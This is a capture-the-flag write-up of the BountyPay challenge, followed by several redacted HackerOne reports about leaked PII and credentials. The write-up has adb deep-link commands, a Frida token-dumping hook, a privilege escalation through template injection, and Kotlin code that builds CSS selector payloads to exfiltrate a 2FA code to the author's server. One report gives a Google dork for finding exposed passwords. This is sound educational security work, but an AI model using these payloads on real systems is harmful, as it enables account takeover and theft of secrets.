After downloading the APK at https://software.bountypay.h1ctf.com/uploads/BountyPay.apk I opened it with [JADX](https://github.com/skylot/jadx):

```
$ jadx-gui BountyPay.apk
```

As an Android developer myself, I'm pretty familiar with how an APK works so this should be an easy challenge for me.

I always start off by checking the `AndroidManifest.xml` which gives me a summary of the attack surface of the app. It contains all entry points that external apps can use.

I noticed the app consists of 4 activities (or views):

- MainActivity
- PartOneActivity
- PartTwoActivity
- PartThreeActivity

All parts have [deep link](https://developer.android.com/training/app-links/deep-linking) configured which allows them to be opened by external apps or links.

Because the MainActivity is the first opened (intent action `android.intent.action.MAIN`), I started checking the code it contains.

It seems to contain a "submit username" logic and no dangerous code so I safely installed the APK on a rooted device using [ADB](https://developer.android.com/studio/command-line/adb):

```
$ adb install -r -t BountyPay.apk
```

I opened the app in the device which looks like this:

{F862851}

Checking at the code, in order to proceed to the `PartOneActivity` the following condition should be met:

```java
getSharedPreferences(KEY_USERNAME, 0).contains("USERNAME")
```

The username should be `USERNAME`. I've typed that in the username edit view and tapped the fab button which led me to the part one activity.

{F862852}

Looking again for `startActivity` in `PartOneActivity` revealed that the part two is opened if the following condition is met:

```java
getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")
```

`getIntent().getData()` can be sent by the app itself or external apps if the activity is exported. This can also be infered with deep link, which this activity has configured in the manifest. The link should containing a parameter `start` whose value is `PartTwoActivity`. The last condition is just to check that the initial step was completed.

Checking the manifest for `PartOneActivity`:

```
<data android:scheme="one" android:host="part"/>
```

Let's craft the URI and call it using `adb`:

```
$ adb shell am start -a "android.intent.action.VIEW" -d "one://part/?start=PartTwoActivity"
```

This is the same as tapping a link in a webpage:

```
<a href="one://part/?start=PartTwoActivity">Start</a>
```

{F862853}

Now, to part two, the conditions are:

{F862855}

We need to type the correct value of the `dataSnapshot` in an edit box. All edit boxes are invisible. To show them, we need deep linking again: 

```java
String firstParam = data.getQueryParameter("two");
String secondParam = data.getQueryParameter("switch");
if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on"))
```

Crafting the command:

```
$ adb shell am start -a "android.intent.action.VIEW" -d "two://part/?two=light\&switch=on"
```

Lights up:

{F862854}

Now, in order to know which value is being checked, I'm going to use [Frida](https://frida.re/). Frida is a powerful debugger that allows me to get access to internal variables and log their values. I can use JavaScript to create a script that logs me all values returned from `dataSnapshot.getValue()`. This way, I know exactly what value should be typed.

The frida script looks like this:

```javascript
Java.performNow(function() {
   Java.use("com.google.firebase.database.DataSnapshot").getValue.overload().implementation = function() {
    var result = this.getValue()
    console.log(result)
    return result
  }
}, 0)
```

It intercepts all calls to `getValue` from `DataSnapshot` and logs their value.

The result:

```
$ frida -U -l bounty_app.js --no-paus -f bounty.pay
     ____
    / _  |   Frida 12.8.9 - A world-class dynamic instrumentation toolkit
   | (_| |
    > _  |   Commands:
   /_/ |_|       help      -> Displays the help system
   . . . .       object?   -> Display information about 'object'
   . . . .       exit/quit -> Exit
   . . . .
   . . . .   More info at https://www.frida.re/docs/home/
Spawned `bounty.pay`. Resuming main thread!                             
[HTC m8::bounty.pay]-> Token
```

The value is `Token`. The condition checks if the text inserted is equals to `X-Token`. Let's type that and tap Submit:

{F862856}

Also, the frida script, which was still running already logged 2 more values:

```
http://api.bountypay.h1ctf.com
8e9998ee3137ca9ade8f372739f062c1
```

Again, this should be opened with deep linking params. The logic is the same, but this time they are encoded in Base64.

```
$ adb shell am start -a "android.intent.action.VIEW" -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token"
```

{F862857}

Lights up again.

So the leaked hash should be the one that was already printed by Frida.

```
$ adb shell input text 8e9998ee3137ca9ade8f372739f062c1
```

Tap submit and ....

{F862858}

Checking the logs from the app with `adb logcat` shows:

```
2020-06-10 18:04:41.481 4207-5742/bounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com
2020-06-10 18:04:41.481 4207-5742/bounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1
2020-06-10 18:04:41.485 4207-5742/bounty.pay D/HEADER VALUE AND HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1
```

We have a token for the API. Let's see if I can make a request:

{F862859}



# Escalation to admin

I decided to list all endpoints using a [wordlist](https://github.com/chrislockard/api_wordlist/blob/master/objects.txt) containing common API endpoints.

There are 2 endpoints. `/api/staff` and `/api/accounts`

The `/api/staff` lists all accounts  from `staff.bountypay.h1ctf.com` and the `/api/accounts` the ones from `app.bountypay.h1ctf.com`. I already have an account for customers. I need a staff account. After some tries I eventually got a valid request when doing a `POST` rather than a `GET `.

```
["Missing Parameter"]
```

Okay... The parameter should be `staff_id` which was seen in the object from `/api/staff`.

I tried `staff_id=STF:84DJKEIP38` but the response said: 

```
["Staff Member already has an account"]
```

This endpoint is creating a new account. I need to use a staff that was not in the list. I remember that Twitter page containing Sara's STF id. 

Let me try that:

{F862860}

Epic. I have a Staff account. Let's log in.

{F862867}

There's a lot of stuff here. So I gathered all information I could about this:

- Multiple HTML templates injected with `?template=`
- A list of tickets
- A detailed page of a ticket
- A logout feature
- A profile change feature (avatar and name)
- A `webpage.js` containing admin logic for `/admin`
- A report page feature

I've run a scan again and found out that there is also an `admin` template but that is locked for admins only.

I tried a lot of stuff here. I tried decrypting the token for this domain page, XSS with avatar and name, SQLi in the `ticket_id ` but nothing worked. 

The only thing that eventually worked was PHP array parameters:

 https://staff.bountypay.h1ctf.com/?template[]=home&template[]=ticket

After a day of rest, I restarted with a fresh head and the mindset that I need to upgrade my account to admin to access the new template.

The report page seems to be the only way to submit data for an admin to read. It also says that the `/admin` pages will be ignored. So, I can't just send the `/admin/upgrade` request directly to them.

Okay, I might need to use the profile change feature. Changing the avatar is reflect in the ticket's page. The avatar is injected in the HTML as a `class`. The `js` also contains a trigger click logic for when `#tab1` is in the url so it should be easy to click on my avatar. I can change my avatar to the `upgradeToAdmin tab1` and it might work:

After navigating to https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab1 I noticed that the avatar was indeed clicked, which triggered the following request:

https://staff.bountypay.h1ctf.com/admin/upgrade?username=undefined

I'm on to something. I need to infer the username somehow. Checking the javascript I concluded that the username was taken from an input field with id `username`. This should have a been easy step from here, but I totally forgot about the login webpage. I wasted a lot of time here. Eventually I remembered the `login` page so I tried this:

https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1

This correctly triggered an upgrade request to my username. I reported the Base64 version of `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1` to the `/admin/report` and retried fetching the admin template again:

https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjE=

Opened https://staff.bountypay.h1ctf.com/?template=admin:

```
view admin
```



#CSS exfiltration

Falling back to `/?template=home` there is a new `Admin` tab :

{F862861}

There's the password for `marten.mickos` but still no flag.

I've logged in to the Customer portal with its credentials. 2FA was asked again and I reused the same `challenge` and `challenge_answer` as before.

Now in, there are some payments left for 05/2020:

{F862862}

Let's pay them.

{F862863}

Oh no, another 2FA. 

I tapped send challenge and a CSS page was sent in the request. That's odd.

```
app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

I proceeded without checking the CSS yet. The next page asks for a 7 chars code. It seems that we have two minutes to send the code.

The following data is sent to the server:

- challenge_timeout 
- challenge

The `challenge_timeout` is a timestamp and the `challenge` is another MD5.

Let's go back to that CSS page:

```css
/**
Template for the UNI 2FA App
 */

body {
    background-color: #FFFFFF;
}

div.branding {
    height:80px;
    width:80px;
    margin:20px auto 40px auto;
    background-image:url("https://www.bountypay.h1ctf.com/images/bountypay.png");
    background-position:center center;
    background-repeat: no-repeat;
    background-size: cover;
}
```

This is a branding CSS page. It looks like the 2FA app changes its layout according to the brand requesting the code. 

I've fired up [ngrok](https://ngrok.com/) and created a simple HTTP tunnel to see if I get any request back when sending my URL rather than that CSS one.

```
$ ./ngrok http 8080
```

After sending my page to https://app.bountypay.h1ctf.com/pay/ I got a response back in ngrok:

```
HTTP Requests                                                                                                                                                                                     
-------------                                                                                                                                                                                     
                                                                                                                                                                                                  
GET /                          200 OK    
```

I checked the headers of the request but nothing relevant there.

I don't know any CSS attacks. So I googled for `css attack vectors`.

Google though I was searching for `XSS` but the 3rd result lead me to a [page](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense) that described a exfiltration attack using only CSS selectors. 

I opened [IntelliJ IDEA](https://www.jetbrains.com/idea/) and coded a quick [ktor](https://ktor.io/) server in [Kotlin](https://kotlinlang.org/). The server basically returns a CSS page with a background to another page of the server. I just wanted to make sure that CSS is processed:

```kotlin
fun main() {
    val server = embeddedServer(Netty, port = 8081) {
        routing {
            get("/test") {
                call.respondText("""
                    body {
                        background-image:url("/test2");
                    }
                """.trimIndent(), ContentType.Text.CSS)
            }

            get("/test2") {
                println("GOT REQUEST")
                call.respondText("", ContentType.Image.JPEG)
            }
        }
    }
    thread {
        server.start(wait = true)
    }
}
```

And the result:

{F862864}

Everything good so far. I started by checking if the server had any `<input>` field by returning the following CSS:

```css
input {
	background-image:url("/test2");
}
```

I got a request. So this means that the page has an `<input>` field. That is where the code should be. I improved my code to retrieve the name of the input.

The method generates an exfiltration payload containing all possible letters and numbers pointing the background url back to the server with the letter that got an hit:

```kotlin
const val allowedChars = "0123456789abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVXYZ"
//...
private fun generateExfilPayload(): String {
    val singleExfilPayload = """
        input[name^=%s] {
            background:url(/hit?char=%s);
        }
        
    """.trimIndent()

    val builder = StringBuilder()

    for (char in allowedChars.toCharArray()) {
        builder.append(singleExfilPayload.format(char, char))
    }

    return builder.toString()
}
```

I'm using `input[name^=%s]` which means that any input field whose name starts with the letter `%s` will have a background of `/hit?char=%s`. When I get back the first result, I update the server to include the new letter. 

Imagining that the input is `username`, I should receive first a `/hit?char=u`. Changing the selector to `input[name^=u%s]` should give me the second char and so on.

This gave me an input named `code`. I did a quick double check with `input[name=code]` but nothing popped up. The input starts with `code` but it's not code. And the char next is not available in my `allowedChars`. I tested for both `-`and `_` and I got a hit at the underscore. I proceed with the payload `input[name^=code_%s]` and I got 7 hits.

What? There are 7 codes in this application? So the user can pick one at will? Well I do have more than one backup code for 2FA in my personal apps. Maybe that's the case. Let's focus on `code_1`.

This is where things went crazy. At every request, the code from the input changed. There is no way I could retrieve all possible chars of `code_1`. Exactly. All possible chars. At this point I was totally convinced that there were 7 inputs, each one with 7 digits, representing 7 different codes. And it would be a pain to retrieve them since they are changing at every request.

I came across with a Medium [post](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) with a great proof of concept about how we can use a chain of `@import` and delay the response until we know what is the first char. We then return the first `@import` containing another `@import` and the payload for the second char and so on. It sounded epic. I decided to code my own.

It didn't work... The second request never came. I should have know by know that the code was only one digit.

I tried another selector. `input[name$=%s]`. This is an ends-with instead of starts-with. The result for starts-with and ends-with returned the same character. Af first I was like "Okay, what are the odds right? The code starts and ends with the same char.". Until I tried it again...and again... and eventually got it. They do not start and end with the same char. They have only one char... Oh my god. It's easier and I over engineered the whole thing.

Back to Kotlin, I've updated my `generateExfilPayload` method to return the following:

```kotlin
const val codeSize = 7
//...
private fun generateExfilPayload(): String {
    val singleExfilPayload = """
        input[name=code_%d][value='%s'] {
            background:url(/hit?char=%s&position=%d);
        }
        
    """.trimIndent()

    val builder = StringBuilder()

    for (i in 1..codeSize)
        for (char in allowedChars.toCharArray()) {
            builder.append(singleExfilPayload.format(i, char, char, i))
        }

    return builder.toString()
}
```

This basically creates a CSS page that contains 7 blocks of 61 `input[name=code_%d][value='%s']`. One for each char and each input.

Firing up the server and sending the URL again:

```
Got a new hit - p
Current value - p
Got a new hit - Z
Current value - pZ
Got a new hit - Z
Current value - pZZ
Got a new hit - z
Current value - pzZZ
Got a new hit - 3
Current value - pzZ3Z
Got a new hit - Z
Current value - pzZ3ZZ
Got a new hit - D
Current value - pzZ3ZDZ
```

Using the `challenge_timeout` and `challenge` returned by `POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba` and submitting the `challenge_answer` `pzZ3ZDZ`...

{F862865}

Here is the flag:

```
^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$
```



# Conclusion

This was my first big CTF and learned a lot from it. The APK was the easiest part since I already had a good setup ready. Using Frida to log the variables was a fast way to know which kind of validations were done.

The privilege escalation to admin took me a lot of time to figure out. There were a lot of components involved and need to perform the attack. The fact that I took so much time in the paged already logged in, made me forget about the `login` template so I also wasted a lot of time figuring out how to inject the username.

The CSS was really funny. It also teach me not to make assumptions that easy. I've coded a whole server similar to [sic](https://github.com/d0nutptr/sic) just to see it fail because there was only one char, and not 7. After figuring out that the code was only 1 digit, reaching the flag was pretty quick.



# References

- https://portswigger.net/burp
- https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
- https://en.wikipedia.org/wiki/Multi-factor_authentication
- https://www.tunnelsup.com/hash-analyzer/
- https://developer.android.com/training/app-links/deep-linking
- https://developer.android.com/studio/command-line/adb
- https://frida.re/
- https://github.com/chrislockard/api_wordlist/blob/master/objects.txt
- https://ngrok.com/
- https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense
- https://www.jetbrains.com/idea/
- https://ktor.io/
- https://kotlinlang.org/
- https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b
- https://github.com/d0nutptr/sic
- https://www.w3schools.com/cssref/css_selectors.asp
- https://www.base64encode.org/
- https://www.md5hashgenerator.com/
- https://schoolsofweb.com/how-to-pass-an-array-as-url-parameter-in-php/



@kanytu

## Impact

Full account take over

---

### [Previously Compromised PulseSSL VPN Hosts](https://hackerone.com/reports/852713)

- **Report ID:** `852713`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r00tpgp
- **Bounty:** - usd
- **Disclosed:** 2020-05-27T14:25:54.096Z
- **CVE(s):** -

**Vulnerability Information:**

Hi again!!

Back in 2019, I had reported that a pulseSSL VPN server owned by US DoD can be compromised by a publicly available exploit. The report is #681249. As a result, the userid and passwd db was also compromised. I  found  that at least 1 userid and password combination from that compromised db can still be used. 


##PoC

Here is a screenshot of me accessing a US DoD owned website using a compromised credentials found back in 2019. I am still able to login to https://████/dana-na/auth/url_46/welcome.cgi with:

l: ███
p: █████████

███████
███████

Here is the creds from  Sep, 2019.

█████

## Impact

It is widely reported in the media that blackhat hackers around the world are still hacking fully patched PulseSSL VPN hosts because owners did not change the passwords that was compromised back in 2019. The articles that I am referring  to is at :

https://www.us-cert.gov/ncas/alerts/aa20-107a
https://thehackernews.com/2020/04/pulse-secure-vpn-vulnerability.html

##Fix
Other than patching, it is strongly advisable that the impacted organization `███`   __reset all passwords immediately__.

---

### [SSN leak due to editable slides](https://hackerone.com/reports/693943)

- **Report ID:** `693943`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T18:09:29.111Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A presentation slide contains a screenshot of a records brief which contains an SSN
**Description:**
The slides try to redact the PII of the records with a blue block but we can remove it by editing the slides to remove the offending blue block
## Impact
Critical 
## Step-by-step Reproduction Instructions
We can see an officer record brief, but the area with the SSN is blocked. We can make a copy of the file and edit it to remove the blue block thus allowing us to see the SSN
https://█████████/wp-content/uploads/2018/03/███████
Slide 84
███████
█████████
## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions

Purge Doc

## Impact

Identity theft

---

### [PII Leak via https://████████](https://hackerone.com/reports/808338)

- **Report ID:** `808338`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:34:35.787Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker can create an account on https://████ and gain access to a wealth of PII for practically every member that is registered on the website. This includes e-mail addresses, physical addresses, telephone numbers, and other information about a vast majority of the US Air Force, as this portal is where ████████ support is hosted.

**Description:**

## Impact
An adversary can sign up for an account on https://█████████ to gather a vast amount of PII related to a large portion of the USAF. This can be used for many purposes and should not be accessible by a regular user.

## Step-by-step Reproduction Instructions

1. Browse to https://██████████
███████
2. Create an account or sign in and visit your profile page in the top right corner.
████
3. Click on `Department` and select `AU Registrar` from the drop-down menu. Once selected, click the `i` icon to the left of the `AU Registrar` field.
█████████
4. In the next screen, click the `Users` field in the `Related Lists` section.
█████████
5. All users in the `AU Registrar` department will be shown. Clicking a user will display PII and other account information. I have redacted any PII from the screenshot.
█████████
6. To access data from ALL users, simply click the `All` field above the user table. You can search for specific users as well, as shown in the below screenshot were I searched for `Bob`. Once again, I redacted any PII from this screenshot.
███

## Suggested Mitigation/Remediation Actions
Limit this function to administrators only, as regular users should not be able to access this type of data (especially when any user can sign up from the open internet, regardless of ██████████ enrollment).

## Impact

An adversary can sign up for an account on https://███████ to gather a vast amount of PII related to a large portion of the USAF. This can be used for many purposes and should not be accessible by a regular user.

---

### [PII leakage-Full SSN on ███](https://hackerone.com/reports/644358)

- **Report ID:** `644358`
- **Severity:** Critical
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-10T19:14:46.530Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I discovered a pdf file on ████████ that outlines various information corresponding to military members. It reveals information on date of birth, where they were born, marriage status, race, children/dependents, etc
**Description:**
I discovered what looks to be an internal file that outlines sensitive information on various service member and looks to be publicly accessible
## Impact
High
## Step-by-step Reproduction Instructions
Visit: https://█████/wp-content/uploads/2018/12/██████████

## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions
Remove immedietly

## Impact

An attacker can gleam highly personal information on military members.

**Summary (researcher):**

This was a simple Google dork search as well as checking other search engines to discover sensitive documents.

---

### [Partial SSN exposed through Presentation slides on ██████████](https://hackerone.com/reports/665144)

- **Report ID:** `665144`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2019-10-10T19:14:00.989Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
During a search of ████████ I discovered that one of the slides ina presentation contained a screen shot of live data. 
**Description:**
The slides describe testing and using military application to organize and aggregate data on users. On one of the slides it does show a screen shot of actual data. I'm assuming it's live due to the fact that part of it was blocked out like the previous report where it showed XXXX and 4 digits.
## Impact
Critical
## Step-by-step Reproduction Instructions
████
## Product, Version, and Configuration (If applicable)
N/A
## Suggested Mitigation/Remediation Actions
Purge the file

## Impact

Last 4  digits of an SSN can be used on various web portals along with knowing the full name of the soldier can give us access to sensitive portals

---

### [Online training material disclosing username and password](https://hackerone.com/reports/672629)

- **Report ID:** `672629`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** U.S. Dept Of Defense
- **Reporter:** @scraps
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:41:39.814Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A training document is revealing username and password details for what appears to be a DoD training system

**Description:**
Using the google dork ``site:*.mil ext:ppt intext:password``, I was able to find a number of powerpoint documents on .mil websites that include username and passwords.

This document appears to be some old training materials

Slide 39 of www.███████/█████████ 

See: █████████

In this instance, the document relates to an online training platform at https://████████/, so if the credentials are still valid, anyone who reads that presentation could potentially access that system and any data it holds. Training databases often have elements of sensitive data left over from old production databases, so this may expose sensitive information.

**Please note that I did not attempt to login using the credentials, as I didn't want to violate any terms of your policy.**

If you would like me to attempt to login to test this vulnerbility, please let me know. 

## Step-by-step Reproduction Instructions

Using the google dork ``site:*.mil ext:ppt intext:password``, examine any results which appear to include usernames or passwords

See: ███

## Impact

Attackers may be able to access the contents of either system, which could include sensitive data.

---

### [Leaking sensitive information lead to compromise employer API keys](https://hackerone.com/reports/273630)

- **Report ID:** `273630`
- **Severity:** High
- **Weakness:** Insecure Storage of Sensitive Information
- **Program:** Yelp
- **Reporter:** @xsam
- **Bounty:** - usd
- **Disclosed:** 2017-11-09T22:01:22.628Z
- **CVE(s):** -

**Summary (team):**

The configuration file of an internal IRC bot (which included credentials to internal services and some external services used by Yelp developers) was inadvertently included by an employee in a personal public GitHub repository. The repository was taken down and the affected credentials rotated.

---
